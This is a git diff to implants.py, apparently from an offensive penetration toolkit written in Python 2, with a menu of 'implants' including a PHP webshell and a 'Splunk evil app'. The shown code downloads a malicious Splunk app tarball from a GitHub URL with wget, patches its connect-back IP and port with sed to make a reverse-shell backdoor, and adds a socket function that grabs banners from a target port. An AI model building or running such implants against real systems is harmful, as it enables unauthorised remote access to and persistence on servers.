@@ -2,8 +2,12 @@
 # implants.py - core file for implants
 #
 # current:
-#   - splunk app
-#
+#  - local:
+#    - splunk app
+#  - remote:
+#    - ...
+# 
+#  
 
 # --- imports ---
 import subprocess
@@ -12,6 +16,7 @@ import sys
 import requests
 import random
 import string
+import socket
 
 # from files if needed
 sys.path.append('files')
@@ -94,6 +99,8 @@ def implant_local():
   print ''
   print '      [a] PHP webshell - simple file (win/lin)'      # to fix
   print '      [b] Splunk evil app (lin)'
+  print '      [c] receive some answers from remote port'
+  print ''
 
   #  print '      [e] getRes'...
   print '' + ENDC
@@ -110,16 +117,21 @@ def implant_local():
   elif choice == 'b':
     print OKGREEN + '  [+] Splunk evil app (lin)' + ENDC
     print ''
-    splunk_evil_app()
+    splunk_evil_app()   
+
+  elif choice == 'c':
+    print OKGREEN + '  [+] receive some answers from remote port' + ENDC
+    print ''
+    receive_port()
 
   else:
     print FAIL + '[-] wrong. try again next year.\n' + ENDC
     core.menu() # starter() # goto 'main()'
 
 
-## ---
+## --- 
 # our super implants:
-#
+# 
 
 def splunk_evil_app():
   print OKGREEN
@@ -134,7 +146,7 @@ def splunk_evil_app():
     default_app = 'https://github.com/c610/tmp/raw/master/apka2.tgz'
     getapp = 'wget ' + default_app + ' -O /tmp/apka2.tgz'
     subprocess.call([ getapp ], shell=True)
-    print OKGREEN + '\n'
+    print OKGREEN
     print '  [+] app should be ready in /tmp/apka2.tgz'
     print '  [+] preparing...' + ENDC
 
@@ -143,7 +155,7 @@ def splunk_evil_app():
 
     lhost = raw_input('    connecback to[IP]> ')
     lport = raw_input('    connctback to[port] ')
-
+    
 
     rewriteapp = "cd /tmp; tar zxvf /tmp/apka2.tgz;"
     rewriteapp += "cd /tmp/apka2/bin;sed -e 's/192.168.1.160/" + lhost + "/g' apka2.py > apkanew.py;"
@@ -155,7 +167,7 @@ def splunk_evil_app():
 
     subprocess.call([rewriteapp], shell=True)
     print OKGREEN + '  [+] Splunk app rewrited: /tmp/apkash.tgz\n' + ENDC
-    # print appname
+    print appname
 
 
   elif get_or_have == '2':
@@ -164,7 +176,35 @@ def splunk_evil_app():
   else:
    print FAIL + '  [-] Maybe later ;[\n' + ENDC
 
-
+  
   print OKGREEN + '  [+] Creating Splunk evil app - finished.\n' + ENDC
 
 
+
+### ---
+def receive_port():
+
+  # print OKGREEN
+  # print '  [+] receive some answers from remote port' + ENDC
+  print '' + BOLD + '\n'
+
+  target = raw_input('    set target: ') 
+  port = raw_input('    set port: ')
+
+  try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    conn = s.connect((target, int(port)))
+
+    print '\n    [+] received:'
+    print s.recv(1024)
+    print ' -- -- --\n'
+
+    #s.send('GET /' + buffer + ' HTTP/1.0\r\n\r\n')
+    #print s.recv(1024)
+    s.send('quit\r\n')
+    s.close()
+
+  except socket.error:
+    print FAIL + '  [-] Connection error ;Z\n' + ENDC
+
+  
